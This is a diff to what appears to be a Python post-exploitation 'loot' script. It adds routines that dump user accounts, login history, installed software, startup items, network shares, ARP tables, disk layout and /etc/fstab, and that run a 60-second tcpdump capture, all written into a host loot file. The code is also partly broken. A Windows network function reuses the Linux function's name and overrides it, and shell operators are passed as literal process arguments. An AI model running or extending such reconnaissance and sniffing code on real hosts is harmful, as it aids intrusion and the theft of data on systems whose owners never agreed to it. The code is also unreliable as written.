@@ -1,4 +1,4 @@
-import re, sys, os, platform, ipaddress, socket, zipfile
+import re, sys, os, platform, socket, zipfile
 from subprocess import Popen, PIPE
 
 #
@@ -59,7 +59,10 @@ def lootme_stub(outfiles):
 
 ### lootme_windows --start--
 def lootme_windows(outfiles):
-    import winreg
+    try:
+        import winreg
+    except:
+        print('winreg module not present')
     if "systemdrive" in os.environ:
         osroot = os.listdir(os.environ["systemdrive"])
         print('%systemdrive% = '+str(osroot))
@@ -71,7 +74,7 @@ def lootme_windows(outfiles):
     with open(hostloot, 'w') as outFile:
         # Dump machine info
         machine_info(outFile)
-        
+        machine_info_extra_win(outFile)
     return
 ### lootme_windows --end--
 
@@ -82,8 +85,10 @@ def lootme_linux(outfiles):
     with open(hostloot, 'w') as outFile:
         # gather machine info
         machine_info(outFile)
-        #gather network info
-        network_info(outFile)
+        # gather user info
+        user_info_lin(outFile)
+        # gather network info
+        network_info_lin(outFile)
         # gather disk info
         disk_info(outFile)
         # search user files for extractable data
@@ -105,8 +110,42 @@ def machine_info(outFile):
     outFile.write("Environment vars:\n"+str(os.environ)+'\n')
 ### Machine info --end--
 
+### Machine info extra Windows --start--
+def machine_info_extra_win(outFile):
+    pArgs = ["wmic", "os"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["wmic", "product"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["wmic", "logicaldisk"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["wmic", "netlogin"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["wmic", "startup"]
+    execoutput_grab(outFile, pArgs)
+### Machine info extra Windows --end--
+
+### User info Windows --start--
+def user_info_win(outFile):
+    pArgs = ["net", "user"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["wmic", "UserAccount", "get", "Name"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["wmic", "rdaccount"]
+    execoutput_grab(outFile, pArgs)
+### User info Windows --end--
+
+### User info Linux --start--
+def user_info_lin(outFile):
+    pArgs = ["getent", "passwd"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["w"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["last"]
+    execoutput_grab(outFile, pArgs)
+### User info Linux --end--
+
 ### Network info Linux --start--
-def network_info(outFile):
+def network_info_lin(outFile):
     if os.path.isfile('/etc/sysconfig/network'):
         filecontents_grab(outFile,  '/etc/sysconfig/network')
        
@@ -126,12 +165,47 @@ def network_info(outFile):
         
     pArgs = ["ifconfig"]
     execoutput_grab(outFile, pArgs)
+    pArgs = ["arp", "-v"]
+    execoutput_grab(outFile, pArgs)
+
+    try:
+        pArgs = ["timeout", "60", "tcpdump"]
+        execoutput_grab(outFile, pArgs)
+    except:
+        try:
+            pArgs = ["tcpdump", "&"]
+            execoutput_grab(outFile, pArgs)
+            pArgs = ["sleep", "60s", "&&", "pkill", "-HUP", "-f", "tcpdump"]
+            execoutput_grab(outFile, pArgs)
+        except:
+            print('\ntcpdump capture failed.\n')
+
+
 ### Network info Linux --end--
+
+### Network info Windows --start--
+def network_info_lin(outFile):
+    pArgs = ["wmic", "nicconfig"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["wmic", "netuse"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["wmic", "share"]
+    execoutput_grab(outFile, pArgs)
+
+### Network info Windows --end--
 
 ### Disk info Linux --start--
 def disk_info(outFile):
     pArgs = ["df"]
     execoutput_grab(outFile, pArgs)
+    pArgs = ["lsblk"]
+    execoutput_grab(outFile, pArgs)
+    pArgs = ["blkid"]
+    execoutput_grab(outFile, pArgs)
+    
+    path = '/etc/fstab'
+    if os.path.isfile(path):
+        filecontents_grab(outFile, path)
 ### Disk info Linux --end--
 
 ### User data extraction Linux --start--
